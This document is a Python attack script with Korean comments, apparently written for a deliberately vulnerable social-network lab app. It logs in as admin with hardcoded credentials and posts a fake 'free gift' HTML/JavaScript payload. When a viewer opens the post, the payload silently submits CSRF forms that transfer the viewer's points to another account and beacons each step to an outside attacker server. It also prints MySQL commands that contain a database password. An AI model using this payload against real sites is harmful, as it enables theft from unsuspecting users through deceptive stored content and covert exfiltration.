#!/usr/bin/env python3
"""
fake-gift CSRF 공격 - 단순화 버전
문제: iframe 응답 확인 불가능 (cross-origin)
해결: 일정 횟수만 시도 후 중단
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"
INDEX_URL = f"{TARGET}/index.php"

# 단순화된 fake-gift HTML - 작은 금액만 시도
FAKE_GIFT_HTML = """<div id="giftbox" style="font-family:Arial;text-align:center;padding:30px;background:linear-gradient(135deg,#667eea,#764ba2);color:white"><div style="background:white;color:#333;padding:40px;border-radius:15px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.3)"><div style="font-size:80px">🎁</div><h2 style="color:#667eea">축하합니다!</h2><p style="font-size:1.2em">무료 포인트 지급 중...</p><div id="s" style="background:#f0f0f0;padding:10px;border-radius:8px;margin:15px 0;color:#667eea;font-weight:bold">처리 중...</div></div><div id="f"></div></div><script>(function(){if(localStorage.getItem('gift_claimed')){document.getElementById('giftbox').innerHTML='<p style="padding:20px;color:#666">이미 받으셨습니다</p>';return}localStorage.setItem('gift_claimed','1');const A='http://13.158.67.78:5000';let total=0;function n(e,p){const i=new Image();i.src=A+e+'?'+p+'&t='+Date.now()}n('/notify','event=load');const am=[5000,3000,2000,1000,500,300,200,100];let h='';am.forEach((a,i)=>{h+='<form id="f'+i+'" method="POST" action="http://52.78.221.104/profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+a+'"><input type="hidden" name="message" value="E"></form><iframe name="if'+i+'" style="display:none"></iframe>'});document.getElementById('f').innerHTML=h;let idx=0;function go(){if(idx>=am.length){n('/complete','total='+total);document.getElementById('s').innerHTML='완료!';return}const a=am[idx];document.getElementById('f'+idx).submit();total+=a;n('/transfer','amount='+a);document.getElementById('s').innerHTML='처리 중 '+(idx+1)+'/'+am.length;idx++;setTimeout(go,500)}go()})();</script>"""

print("="*60)
print("🎁 fake-gift 단순화 버전 (작은 금액만)")
print("="*60)
print()

session = requests.Session()

print("[*] admin으로 로그인...")
r = session.post(LOGIN_URL, data={'username': 'admin', 'password': 'admin123'}, allow_redirects=True)

if 'index.php' in r.url or 'profile.php' in r.url:
    print("[+] 로그인 성공!")
else:
    print("[-] 로그인 실패")
    exit(1)

print("\n[*] 먼저 기존 게시물 삭제:")
print("    mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"DELETE FROM posts WHERE content LIKE '%🎁%';\"")

print("\n[*] 단순화 버전 게시...")
r = session.post(POST_URL, data={'content': FAKE_GIFT_HTML}, allow_redirects=True)

print(f"[+] 응답: {r.status_code}")

r = session.get(INDEX_URL)
if '🎁' in r.text:
    print("[+] 게시 완료!")
    print()
    print("="*60)
    print("✅ 배포 완료!")
    print("="*60)
    print()
    print("특징:")
    print("- 작은 금액만 시도: 5000+3000+2000+1000+500+300+200+100 = 12,100P")
    print("- alice(500P)는 500P만 차감됨")
    print("- 나머지는 자동 실패")
    print("- 자동 리다이렉트 없음")
    print()
    print("**중요**: Flask는 12,100P로 표시되지만")
    print("         실제 차감은 alice 포인트만큼만!")
    print()
    print("해결책: Flask 무시하고 DB에서 확인")
    print("  mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"SELECT username,points FROM users;\"")
    print()
    print("="*60)
else:
    print("[-] 실패")
